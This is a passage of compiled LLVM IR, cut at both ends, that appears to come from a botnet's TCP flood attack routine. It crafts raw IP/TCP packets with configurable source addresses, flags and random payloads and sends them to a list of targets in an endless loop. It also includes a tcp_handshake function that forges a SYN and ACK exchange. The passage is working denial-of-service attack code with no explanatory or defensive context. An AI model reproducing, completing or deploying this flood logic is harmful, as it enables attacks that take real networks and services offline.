  %20 = trunc i16 %19 to i8
  %21 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 16, i16 zeroext -1)
  %22 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 17, i16 zeroext -1)
  %23 = load i32, i32* @LOCAL_ADDRESS, align 4
  %24 = tail call i32 @retrieve_opt_ipv4(%struct.option* %5, i8 zeroext %7, i8 zeroext 18, i32 %23)
  %25 = load %struct.option*, %struct.option** %4, align 8
  %26 = load i8, i8* %6, align 8
  %27 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %25, i8 zeroext %26, i8 zeroext 19, i16 zeroext -1)
  %28 = tail call i8* @retrieve_opt_str(%struct.option* %25, i8 zeroext %26, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %29 = ptrtoint i8* %28 to i64
  %30 = trunc i64 %29 to i32
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i64
  %34 = tail call noalias i8* @calloc(i64 %33, i64 8) #13
  %35 = bitcast i8* %34 to i8**
  %36 = icmp eq i8* %34, null
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:38:                                     ; preds = %1
  %39 = load i8, i8* %31, align 1
  %40 = zext i8 %39 to i64
  %41 = tail call noalias i8* @calloc(i64 %40, i64 4) #13
  %42 = bitcast i8* %41 to i32*
  %43 = icmp eq i8* %41, null
  br i1 %43, label %71, label %.preheader152

.preheader152:                                    ; preds = %38
  %44 = load i8, i8* %31, align 1
  %45 = icmp eq i8 %44, 0
  br i1 %45, label %.preheader, label %.lr.ph155

.lr.ph155:                                        ; preds = %.preheader152
  %46 = bitcast i32* %2 to i8*
  %47 = icmp eq i32 %30, 0
  %48 = zext i16 %8 to i32
  %49 = add nuw nsw i32 %48, 110
  %50 = zext i32 %49 to i64
  %51 = add i16 %8, 40
  %52 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %53 = shl i16 %13, 12
  %54 = and i16 %53, 4096
  %55 = shl i16 %14, 8
  %56 = and i16 %55, 256
  %57 = shl i16 %15, 13
  %58 = and i16 %57, 8192
  %59 = shl i16 %16, 11
  %60 = and i16 %59, 2048
  %61 = shl i16 %17, 10
  %62 = and i16 %61, 1024
  %63 = shl i16 %18, 9
  %64 = and i16 %63, 512
  %65 = or i16 %54, %56
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %70 = zext i16 %12 to i32
  br label %82

; <label>:71:                                     ; preds = %38
  tail call void @exit(i32 1) #15
  unreachable

.preheader.loopexit:                              ; preds = %104
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader152
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %73 = zext i16 %8 to i64
  %74 = add nuw nsw i64 %73, 20
  %75 = trunc i64 %74 to i16
  %76 = trunc i64 %74 to i32
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %80 = add nuw nsw i64 %73, 40
  %81 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %.pr = load i8, i8* %31, align 1
  br label %.loopexit

; <label>:82:                                     ; preds = %.lr.ph155, %104
  %indvars.iv156 = phi i64 [ 0, %.lr.ph155 ], [ %indvars.iv.next157, %104 ]
  %83 = call i32 @socket(i32 2, i32 3, i32 6) #13
  %84 = getelementptr inbounds i32, i32* %42, i64 %indvars.iv156
  store i32 %83, i32* %84, align 4
  %85 = icmp eq i32 %83, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %82
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:87:                                     ; preds = %82
  store i32 1, i32* %2, align 4
  %88 = load i32, i32* %84, align 4
  %89 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* nonnull %46, i32 4) #13
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %87
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:92:                                     ; preds = %87
  br i1 %47, label %99, label %93

; <label>:93:                                     ; preds = %92
  %94 = load i32, i32* %84, align 4
  %95 = load %struct.target*, %struct.target** %69, align 8
  %96 = getelementptr inbounds %struct.target, %struct.target* %95, i64 %indvars.iv156, i32 0
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @tcp_handshake(i16 zeroext %9, i32 %94, i32 %97, i32 %24, i32 %70)
  br label %99

; <label>:99:                                     ; preds = %92, %93
  %100 = call noalias i8* @malloc(i64 %50) #13
  %101 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv156
  store i8* %100, i8** %101, align 8
  %102 = icmp eq i8* %100, null
  br i1 %102, label %103, label %104

; <label>:103:                                    ; preds = %99
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:104:                                    ; preds = %99
  %105 = getelementptr inbounds i8, i8* %100, i64 20
  %106 = getelementptr inbounds i8, i8* %100, i64 40
  %107 = load i8, i8* %100, align 4
  %108 = and i8 %107, 15
  %109 = or i8 %108, 64
  store i8 %109, i8* %100, align 4
  %110 = getelementptr inbounds i8, i8* %100, i64 1
  store i8 %20, i8* %110, align 1
  %111 = call zeroext i16 @htons(i16 zeroext %51) #14
  %112 = getelementptr inbounds i8, i8* %100, i64 2
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  %114 = load i8, i8* %100, align 4
  %115 = and i8 %114, -16
  %116 = or i8 %115, 5
  store i8 %116, i8* %100, align 4
  %117 = getelementptr inbounds i8, i8* %100, i64 6
  %118 = bitcast i8* %117 to i16*
  store i16 0, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %100, i64 8
  store i8 %11, i8* %119, align 4
  %120 = call zeroext i16 @htons(i16 zeroext %21) #14
  %121 = getelementptr inbounds i8, i8* %100, i64 4
  %122 = bitcast i8* %121 to i16*
  store i16 %120, i16* %122, align 4
  %123 = getelementptr inbounds i8, i8* %100, i64 9
  store i8 6, i8* %123, align 1
  %124 = getelementptr inbounds i8, i8* %100, i64 12
  %125 = bitcast i8* %124 to i32*
  store i32 %24, i32* %125, align 4
  %126 = load %struct.target*, %struct.target** %52, align 8
  %127 = getelementptr inbounds %struct.target, %struct.target* %126, i64 %indvars.iv156, i32 0
  %128 = load i32, i32* %127, align 4
  %129 = getelementptr inbounds i8, i8* %100, i64 16
  %130 = bitcast i8* %129 to i32*
  store i32 %128, i32* %130, align 4
  %131 = call zeroext i16 @htons(i16 zeroext %9) #14
  %132 = getelementptr inbounds i8, i8* %100, i64 22
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #14
  %135 = bitcast i8* %105 to i16*
  store i16 %134, i16* %135, align 4
  %136 = call zeroext i16 @htons(i16 zeroext %22) #14
  %137 = zext i16 %136 to i32
  %138 = getelementptr inbounds i8, i8* %100, i64 24
  %139 = bitcast i8* %138 to i32*
  store i32 %137, i32* %139, align 4
  %140 = getelementptr inbounds i8, i8* %100, i64 32
  %141 = bitcast i8* %140 to i16*
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -16369
  %144 = or i16 %68, %143
  %145 = or i16 %144, 80
  store i16 %145, i16* %141, align 4
  %146 = getelementptr inbounds i8, i8* %100, i64 34
  %147 = bitcast i8* %146 to i16*
  store i16 0, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %27) #14
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %100, i64 28
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  call void @rand_string(i8* %106, i32 %48)
  %indvars.iv.next157 = add nuw i64 %indvars.iv156, 1
  %152 = load i8, i8* %31, align 1
  %153 = zext i8 %152 to i64
  %154 = icmp slt i64 %indvars.iv.next157, %153
  br i1 %154, label %82, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %202
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  %155 = phi i8 [ %.pr, %.preheader ], [ %.be, %.loopexit.backedge ]
  %156 = icmp eq i8 %155, 0
  br i1 %156, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  %.be = phi i8 [ 0, %.loopexit ], [ %218, %.loopexit.loopexit ]
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %202
  %indvars.iv = phi i64 [ %indvars.iv.next, %202 ], [ 0, %.lr.ph.preheader ]
  %157 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv
  %158 = bitcast i8** %157 to %struct.iphdr**
  %159 = load %struct.iphdr*, %struct.iphdr** %158, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1
  %161 = load %struct.target*, %struct.target** %72, align 8
  %162 = getelementptr inbounds %struct.target, %struct.target* %161, i64 %indvars.iv, i32 1
  %163 = load i16, i16* %162, align 4
  %164 = icmp ult i16 %163, 32
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %.lr.ph
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 9
  %167 = load i32, i32* %166, align 4
  %168 = call i32 @ntohl(i32 %167) #14
  %169 = call i32 @htonl(i32 %168) #14
  store i32 %169, i32* %166, align 4
  br label %170

; <label>:170:                                    ; preds = %165, %.lr.ph
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 8
  %172 = load i32, i32* %171, align 4
  %173 = icmp eq i32 %172, -1
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %170
  store i32 0, i32* %171, align 4
  br label %175

; <label>:175:                                    ; preds = %174, %170
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 3
  %177 = load i16, i16* %176, align 4
  %178 = icmp eq i16 %177, -1
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %175
  store i16 0, i16* %176, align 4
  br label %180

; <label>:180:                                    ; preds = %179, %175
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 2
  %182 = load i16, i16* %181, align 2
  %183 = icmp eq i16 %182, -1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %180
  store i16 0, i16* %181, align 2
  br label %185

; <label>:185:                                    ; preds = %184, %180
  %186 = bitcast %struct.iphdr* %160 to i16*
  %187 = load i16, i16* %186, align 4
  %188 = icmp eq i16 %187, -1
  br i1 %188, label %189, label %190

; <label>:189:                                    ; preds = %185
  store i16 0, i16* %186, align 4
  br label %190

; <label>:190:                                    ; preds = %189, %185
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 3
  %192 = bitcast i16* %191 to i32*
  %193 = load i32, i32* %192, align 4
  %194 = icmp eq i32 %193, 65535
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %190
  store i32 0, i32* %192, align 4
  br label %196

; <label>:196:                                    ; preds = %195, %190
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 5
  %198 = bitcast i8* %197 to i32*
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, 65535
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %196
  store i32 0, i32* %198, align 4
  br label %202

; <label>:202:                                    ; preds = %201, %196
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 7
  store i16 0, i16* %203, align 2
  %204 = bitcast %struct.iphdr* %159 to i16*
  %205 = call zeroext i16 @ip_header_checksum(i16* %204, i32 20) #13
  store i16 %205, i16* %203, align 2
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 9
  %207 = bitcast i32* %206 to i16*
  store i16 0, i16* %207, align 4
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i64 0, i32 0
  %209 = call zeroext i16 @htons(i16 zeroext %75) #14
  %210 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* nonnull %159, i8* %208, i16 zeroext %209, i32 %76) #13
  store i16 %210, i16* %207, align 4
  store i16 2, i16* %77, align 4
  %211 = load i16, i16* %181, align 2
  store i16 %211, i16* %78, align 2
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 9
  %213 = load i32, i32* %212, align 4
  store i32 %213, i32* %79, align 4
  %214 = getelementptr inbounds i32, i32* %42, i64 %indvars.iv
  %215 = load i32, i32* %214, align 4
  %216 = load i8*, i8** %157, align 8
  %217 = call i64 @sendto(i32 %215, i8* %216, i64 %80, i32 16384, %struct.sockaddr* nonnull %81, i32 16) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %218 = load i8, i8* %31, align 1
  %219 = zext i8 %218 to i64
  %220 = icmp slt i64 %indvars.iv.next, %219
  br i1 %220, label %.lr.ph, label %.loopexit.loopexit
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @tcp_handshake(i16 zeroext, i32, i32, i32, i32) local_unnamed_addr #3 {
  %6 = alloca [40 x i8], align 16
  %7 = alloca [40 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.timeval, align 8
  %11 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %11, i8 0, i64 40, i32 16, i1 false)
  %12 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %12, i8 0, i64 40, i32 16, i1 false)
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %13, i8 0, i64 512, i32 16, i1 false)
  %14 = bitcast [40 x i8]* %6 to %struct.iphdr*
  %15 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 20
  store i8 69, i8* %11, align 16
  %16 = tail call zeroext i16 @htons(i16 zeroext 40) #14
  %17 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 2
  %18 = bitcast i8* %17 to i16*
  store i16 %16, i16* %18, align 2
  %19 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 8
  store i8 64, i8* %19, align 8
  %20 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 9
  store i8 6, i8* %20, align 1
  %21 = tail call zeroext i16 @htons(i16 zeroext %0) #14
  %22 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 22
  %23 = bitcast i8* %22 to i16*
  store i16 %21, i16* %23, align 2
  %24 = trunc i32 %4 to i16
  %25 = tail call zeroext i16 @htons(i16 zeroext %24) #14
  %26 = bitcast i8* %15 to i16*
  store i16 %25, i16* %26, align 4
  %27 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 32
  %28 = bitcast i8* %27 to i16*
  %29 = load i16, i16* %28, align 16
  %30 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 34
  %31 = bitcast i8* %30 to i16*
  store i16 0, i16* %31, align 2
  %32 = and i16 %29, -16369
  %33 = or i16 %32, 592
  store i16 %33, i16* %28, align 16
  %34 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 28
  %35 = bitcast i8* %34 to i32*
  store i32 0, i32* %35, align 4
  %36 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 4
  %37 = bitcast i8* %36 to i16*
  store i16 0, i16* %37, align 4
  %38 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 12
  %39 = bitcast i8* %38 to i32*
  store i32 %3, i32* %39, align 4
  %40 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 16
  %41 = bitcast i8* %40 to i32*
  store i32 %2, i32* %41, align 16
  %42 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 10
  %43 = bitcast i8* %42 to i16*
  store i16 0, i16* %43, align 2
  %44 = bitcast [40 x i8]* %6 to i16*
  %45 = call zeroext i16 @checksum_generic(i16* nonnull %44, i32 20)
  store i16 %45, i16* %43, align 2
  %46 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 24
  %47 = bitcast i8* %46 to i32*
  store i32 0, i32* %47, align 8
  %48 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 36
  %49 = bitcast i8* %48 to i16*
  store i16 0, i16* %49, align 4
  %50 = tail call zeroext i16 @htons(i16 zeroext 20) #14
  %51 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %14, i8* %15, i16 zeroext %50, i32 20)
  store i16 %51, i16* %49, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %52, align 4
  %53 = load i16, i16* %23, align 2
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %53, i16* %54, align 2
  %55 = load i32, i32* %41, align 16
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2, i32 0
  store i32 %55, i32* %56, align 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* nonnull %11, i64 40, i32 16, i1 false)
  %57 = load i32, i32* %35, align 4
  %58 = tail call i32 @ntohl(i32 %57) #14
  %59 = load i32, i32* %47, align 8
  %60 = tail call i32 @ntohl(i32 %59) #14
  %61 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %58, i32 %60)
  %62 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %63 = call i64 @sendto(i32 %1, i8* nonnull %11, i64 40, i32 16384, %struct.sockaddr* nonnull %62, i32 16) #13
  %64 = trunc i64 %63 to i32
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %139, label %66

; <label>:66:                                     ; preds = %5
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 5, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 0, i64* %68, align 8
  %69 = bitcast %struct.timeval* %10 to i8*
  %70 = call i32 @setsockopt(i32 %1, i32 1, i32 20, i8* nonnull %69, i32 16) #13
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %139, label %.preheader

.preheader:                                       ; preds = %66
  %72 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 12
  %73 = bitcast i8* %72 to i32*
  %74 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 32
  %75 = bitcast i8* %74 to i16*
  br label %76

; <label>:76:                                     ; preds = %.preheader, %135
  %.08183 = phi i32 [ 0, %.preheader ], [ %136, %135 ]
  %77 = call i64 @recvfrom(i32 %1, i8* nonnull %13, i64 512, i32 16384, %struct.sockaddr* null, i32* null) #13
  %78 = trunc i64 %77 to i32
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %.loopexit.loopexit, label %80

; <label>:80:                                     ; preds = %76
  %81 = load i32, i32* %73, align 4
  %82 = icmp eq i32 %81, %2
  br i1 %82, label %83, label %135

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %75, align 16
  %85 = and i16 %84, 4608
  %86 = icmp eq i16 %85, 4608
  br i1 %86, label %87, label %135

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 28
  %89 = bitcast i8* %88 to i32*
  %90 = load i32, i32* %89, align 4
  %91 = call i32 @ntohl(i32 %90) #14
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 24
  %93 = bitcast i8* %92 to i32*
  %94 = load i32, i32* %93, align 8
  %95 = call i32 @ntohl(i32 %94) #14
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0), i32 %91, i32 %95)
  %97 = load i32, i32* %93, align 8
  %98 = call i32 @ntohl(i32 %97) #14
  %99 = add i32 %98, 1
  %100 = call i32 @htonl(i32 %99) #14
  %101 = load i32, i32* %89, align 4
  %102 = bitcast [40 x i8]* %7 to %struct.iphdr*
  %103 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 20
  %104 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 32
  %105 = bitcast i8* %104 to i16*
  %106 = load i16, i16* %105, align 16
  %107 = and i16 %106, -16129
  %108 = or i16 %107, 4096
  store i16 %108, i16* %105, align 16
  %109 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 28
  %110 = bitcast i8* %109 to i32*
  store i32 %100, i32* %110, align 4
  %111 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %101, i32* %112, align 8
  %113 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 4
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  %117 = bitcast [40 x i8]* %7 to i16*
  %118 = call zeroext i16 @checksum_generic(i16* nonnull %117, i32 20)
  store i16 %118, i16* %116, align 2
  %119 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 36
  %120 = bitcast i8* %119 to i16*
  store i16 0, i16* %120, align 4
  %121 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %102, i8* %103, i16 zeroext %50, i32 20)
  store i16 %121, i16* %120, align 4
  store i16 2, i16* %52, align 4
  %122 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 22
  %123 = bitcast i8* %122 to i16*
  %124 = load i16, i16* %123, align 2
  store i16 %124, i16* %54, align 2
  %125 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 16
  %126 = bitcast i8* %125 to i32*
  %127 = load i32, i32* %126, align 16
  store i32 %127, i32* %56, align 4
  %128 = load i32, i32* %110, align 4
  %129 = call i32 @ntohl(i32 %128) #14
  %130 = load i32, i32* %112, align 8
  %131 = call i32 @ntohl(i32 %130) #14
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %129, i32 %131)
  %133 = call i64 @sendto(i32 %1, i8* nonnull %12, i64 40, i32 16384, %struct.sockaddr* nonnull %62, i32 16) #13
  %134 = trunc i64 %133 to i32
  br label %.loopexit

; <label>:135:                                    ; preds = %83, %80
  %136 = add nuw nsw i32 %.08183, 1
  %137 = icmp slt i32 %136, 10000
  br i1 %137, label %76, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %135, %76
  %.1.ph = phi i32 [ %78, %135 ], [ -1, %76 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %87
  %.1 = phi i32 [ %134, %87 ], [ %.1.ph, %.loopexit.loopexit ]
  %not. = icmp ne i32 %.1, -1
  %138 = zext i1 %not. to i32
  br label %139

; <label>:139:                                    ; preds = %66, %5, %.loopexit
  %.0 = phi i32 [ %138, %.loopexit ], [ 0, %5 ], [ 0, %66 ]
  ret i32 %.0
}

declare zeroext i16 @ip_header_checksum(i16*, i32) local_unnamed_addr #9

declare zeroext i16 @tcp_udp_header_checksum(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #9

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #0 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.015.prol = phi i64 [ %11, %.lr.ph.prol ], [ 0, %.lr.ph.prol.preheader ]
  %.01114.prol = phi i32 [ %12, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.01213.prol = phi i16* [ %8, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01213.prol, i64 1
  %9 = load i16, i16* %.01213.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.015.prol
  %12 = add i32 %.01114.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !1

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.015.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01114.unr = phi i32 [ %1, %.lr.ph.preheader ], [ %12, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01213.unr = phi i16* [ %0, %.lr.ph.preheader ], [ %8, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.lcssa.unr = phi i64 [ undef, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.015 = phi i64 [ %.015.unr, %.lr.ph.preheader.new ], [ %29, %.lr.ph ]
  %.01114 = phi i32 [ %.01114.unr, %.lr.ph.preheader.new ], [ %30, %.lr.ph ]
  %.01213 = phi i16* [ %.01213.unr, %.lr.ph.preheader.new ], [ %26, %.lr.ph ]
  %14 = getelementptr inbounds i16, i16* %.01213, i64 1
  %15 = load i16, i16* %.01213, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.015
  %18 = getelementptr inbounds i16, i16* %.01213, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01213, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01213, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add i32 %.01114, -8
  %31 = icmp ugt i32 %30, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit.unr-lcssa

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.lcssa = phi i64 [ %.lcssa.unr, %.lr.ph.prol.loopexit ], [ %29, %._crit_edge.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %33 = icmp eq i32 %.011.lcssa, 1
  br i1 %33, label %34, label %39

; <label>:34:                                     ; preds = %._crit_edge
  %35 = load i16, i16* %.012.lcssa, align 2
  %36 = zext i16 %35 to i64
  %sext = shl i64 %36, 56
  %37 = ashr exact i64 %sext, 56
  %38 = add i64 %37, %.0.lcssa
  br label %39

; <label>:39:                                     ; preds = %34, %._crit_edge
  %.1 = phi i64 [ %38, %34 ], [ %.0.lcssa, %._crit_edge ]
